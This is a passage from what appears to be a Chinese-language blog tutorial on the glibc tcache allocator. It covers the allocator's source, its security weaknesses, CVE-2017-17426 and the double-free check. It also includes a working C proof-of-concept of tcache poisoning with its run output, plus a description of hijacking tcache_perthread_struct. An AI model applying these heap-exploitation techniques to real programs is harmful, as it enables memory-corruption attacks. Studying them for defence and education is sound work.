&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>(2)small bins中的情况与fastbins中的相似，双链表中剩余的chunk会被填充到tcache bin中，直到上限。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">   stash them in the tcache.  */</span></span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            bck = tc_victim-&gt;bk;</span><br><span class="line">            set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                set_non_main_arena(tc_victim);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            tcache_put(tc_victim, tc_idx);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（3）当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中(除非tcache 已装满）。然后，程序会从tcache中返回其中一个。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">We may return one of these chunks later.  */</span></span><br><span class="line"><span class="keyword">if</span> (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_put(victim, tc_idx);</span><br><span class="line">    return_cached = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>取出堆块</p>
<ul>
<li>在_libc_malloc()调用int_malloc()之前，如果tcache bin中有符合要求的chunk，则直接将它返回。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line"><span class="keyword">size_t</span> tbytes;</span><br><span class="line"><span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">&#123;</span><br><span class="line">    __set_errno(ENOMEM);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">&#125;</span><br><span class="line">DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>循环处理unsorted bin时，如果在tcache中放入的chunk达到上限，则会直接返回最后一个chunk。默认情况下是没有限制的。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">filling the cache, return one of the cached ones.  */</span></span><br><span class="line">++tcache_unsorted_count;</span><br><span class="line"><span class="keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>在循环处理 unsorted bin 内存块后，如果之前曾放入过 tcache 块，则会取出一个并返回。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果unsorted chunk跟要用户所需要chunk大小一致 那么会首先将该chunk挂入对应的tcache中 然后skip该次循环 所以对于unsorted bin而言 其中与用户需求大小相等的块会被优先放入tcache中去 但是并不直接返回</p>
<p>在unsorted bin最后 如果找到了可以返回的块 并且mp_.tcache_unsorted_limit次数小于处理unsorted count(即tcache中装满了对应的chunk)那么就会从其中拉出一个chunk出来返回<br>在unsorted bin的遍历之后 如果unsorted bin中存在可以返回的chunk 那么在<strong>遍历unsorted bin之后</strong>则调用一次<strong>tcache_get</strong>返回给用户使用</p>
</blockquote>
<p>最后，还需要注意的是tcache中的chunk不会被合并，无论是相 邻chunk，还是chunk和top chunk都不会。这是因为这些chunk的PREV_INUSE位会被标记。</p>
</li>
</ul>
<h4 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h4><p>函数tcache_put()和tcache_get()分别用于从单链表中放入和取出chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个函数都假设调用者已经对参数进行了有效性检查，然而由 于tcache的操作在free和malloc中往往都处于很靠前的位置，导致原 来的许多有效性检查都被无视了。这样做虽然有利于提升执行效率，但对安全性造成了负面影响。</p>
<p>另外，tcache_get()函数中加粗部分的断言是错误的，其本意应该是检查tcache bin中chunk的数量大于0，否则counts可能发生整数溢出变成负数（0x00-1=0xff）。该问题已在libc-2.28中修复。</p>
<h5 id="CVE-2017-17426"><a href="#CVE-2017-17426" class="headerlink" title="CVE-2017-17426"></a>CVE-2017-17426</h5><p>libc-2.26 中 的 tcache 机 制 被 发 现 了 安 全 漏 洞 ， 由 于__libc_malloc()使用request2size()来将请求大小转换为实际块大小，该函数不会进行整数溢出检查。所以如果请求一个非常大的堆块（接近SIZE_MAX），那么就会导致整数溢出，从而导致malloc错误地返回tcache bin里的堆块。</p>
<p>下面是一个例子，可以看到在使用libc-2.26时，第二次调用malloc()时返回了第一次释放的堆块。而在使用libc-2.27时返回NULL，说明该问题已被修复。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354215.png" alt="image-20220409155559302"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354217.png" alt="image-20220409155609373"></p>
<h5 id="二次释放检查"><a href="#二次释放检查" class="headerlink" title="二次释放检查"></a>二次释放检查</h5><p>libc-2.28版本增加了对tcache中二次释放（double free）的检查，方法是在tcache_entry结构体中增加了一个标志key，用于表示chunk是否已经在tcache bin中，如下所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">index <span class="number">6</span>d7a6a8..f730d7a <span class="number">100644</span> (file)</span><br><span class="line">--- a/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c</span><br><span class="line">+++ b/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c</span><br><span class="line">@@ <span class="number">-2967</span>,<span class="number">6</span> +<span class="number">2967</span>,<span class="number">8</span> @@ mremap_chunk (mchunkptr p, <span class="keyword">size_t</span> new_size)</span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">+  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">+  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line"> &#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)</span></span><br><span class="line"><span class="comment"> &#123;</span></span><br><span class="line"><span class="comment">   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span></span><br><span class="line"><span class="comment">   assert (tc_idx &lt; TCACHE_MAX_BINS);</span></span><br><span class="line"><span class="comment">+</span></span><br><span class="line"><span class="comment">+  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">+     detect a double free.  */</span></span><br><span class="line">+  e-&gt;key = tcache;</span><br><span class="line">+</span><br><span class="line">   e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">   tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">   ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">@@ <span class="number">-3005</span>,<span class="number">6</span> +<span class="number">3012</span>,<span class="number">7</span> @@ tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">   assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">   tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">   --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">+  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">@@ <span class="number">-4218</span>,<span class="number">6</span> +<span class="number">4226</span>,<span class="number">26</span> @@ _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">+    <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">+    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">+       trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">+       2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely coincidence</span></span><br><span class="line"><span class="comment">+       before aborting.  */</span></span><br><span class="line">+    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span><br><span class="line">+      &#123;</span><br><span class="line">+       tcache_entry *tmp;</span><br><span class="line">+       LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">+       <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">+            tmp;</span><br><span class="line">+            tmp = tmp-&gt;next)</span><br><span class="line">+         <span class="keyword">if</span> (tmp == e)</span><br><span class="line">+           malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">+       <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a few</span></span><br><span class="line"><span class="comment">+          cycles, but don&#x27;t abort.  */</span></span><br><span class="line">+      &#125;</span><br><span class="line">+</span><br><span class="line">     <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br></pre></td></tr></table></figure>

<h4 id="pwn-tcache"><a href="#pwn-tcache" class="headerlink" title="pwn tcache"></a>pwn tcache</h4><h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h5><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">This file demonstrates a simple tcache poisoning attack by tricking <span class="built_in">malloc</span> into</span></span><br><span class="line"><span class="function">returning a pointer to an arbitrary <span class="title">location</span> <span class="params">(in <span class="keyword">this</span> <span class="keyword">case</span>, the <span class="built_in">stack</span>)</span>.</span></span><br><span class="line"><span class="function">The attack is very similar to fastbin corruption attack.</span></span><br><span class="line"><span class="function">After the patch https:<span class="comment">//sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,</span></span></span><br><span class="line"><span class="function">We have to create <span class="keyword">and</span> <span class="built_in">free</span> one more chunk <span class="keyword">for</span> padding before fd pointer hijacking.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">The address we want <span class="title">malloc</span><span class="params">()</span> to <span class="keyword">return</span> is 0x7ffe6126d428.</span></span><br><span class="line"><span class="function">Allocating 2 buffers.</span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">128</span>)</span>: 0x5598762f7260</span></span><br><span class="line"><span class="function"><span class="title">malloc</span><span class="params">(<span class="number">128</span>)</span>: 0x5598762f72f0</span></span><br><span class="line"><span class="function">Freeing the buffers...</span></span><br><span class="line"><span class="function">Now the tcache <span class="built_in">list</span> has [ 0x5598762f72f0 -&gt; 0x5598762f7260 ].</span></span><br><span class="line"><span class="function">We overwrite the first 8 <span class="title">bytes</span> <span class="params">(fd/next pointer)</span> of the data at 0x5598762f72f0</span></span><br><span class="line"><span class="function">to point to the location to <span class="title">control</span> <span class="params">(<span class="number">0x7ffe6126d428</span>)</span>.</span></span><br><span class="line"><span class="function">Now the tcache <span class="built_in">list</span> has [ 0x5598762f72f0 -&gt; 0x7ffe6126d428 ].</span></span><br><span class="line"><span class="function">1st <span class="title">malloc</span><span class="params">(<span class="number">128</span>)</span>: 0x5598762f72f0</span></span><br><span class="line"><span class="function">Now the tcache <span class="built_in">list</span> has [ 0x7ffe6126d428 ].</span></span><br><span class="line"><span class="function">2nd <span class="title">malloc</span><span class="params">(<span class="number">128</span>)</span>: 0x7ffe6126d428</span></span><br><span class="line"><span class="function">We got the control</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p>首先分配并释放两个堆块</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354218.png" alt="image-20220409161406673"></p>
<p>然后修改chunkb的next指向栈上的地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354219.png" alt="image-20220409161502606"></p>
<p>第二次 malloc即可 malloc 栈上的地址了</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204112354220.png" alt="image-20220409163013831"></p>
<h5 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h5><p>我们已经知道 <code>tcache_perthread_struct</code> 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。</p>
<p>设想有如下的堆排布情况 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tcache_    +------------+</span><br><span class="line">\perthread |......      |</span><br><span class="line">\_struct   +------------+</span><br><span class="line">           |counts[i]   |</span><br><span class="line">           +------------+</span><br><span class="line">           |......      |          +----------+</span><br><span class="line">           +------------+          |header    |</span><br><span class="line">           |entries[i]  |---------&gt;+----------+</span><br><span class="line">           +------------+          |<span class="literal">NULL</span>      |</span><br><span class="line">           |......      |          +----------+</span><br><span class="line">           |            |          |          |</span><br><span class="line">           +------------+          +----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过一些手段（如 <code>tcache posioning</code>），我们将其改为了 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tcache_    +------------+&lt;---------------------------+</span><br><span class="line">\perthread |......      |                            |</span><br><span class="line">\_struct   +------------+                            |</span><br><span class="line">           |counts[i]   |                            |</span><br><span class="line">           +------------+                            |</span><br><span class="line">           |......      |          +----------+      |</span><br><span class="line">           +------------+          |header    |      |</span><br><span class="line">           |entries[i]  |---------&gt;+----------+      |</span><br><span class="line">           +------------+          |target    |------+</span><br><span class="line">           |......      |          +----------+</span><br><span class="line">           |            |          |          |</span><br><span class="line">           +------------+          +----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样，两次malloc 后我们就返回了<code>tcache_perthread_struct</code> 的地址，就可以控制整个 tcache 了。</p>
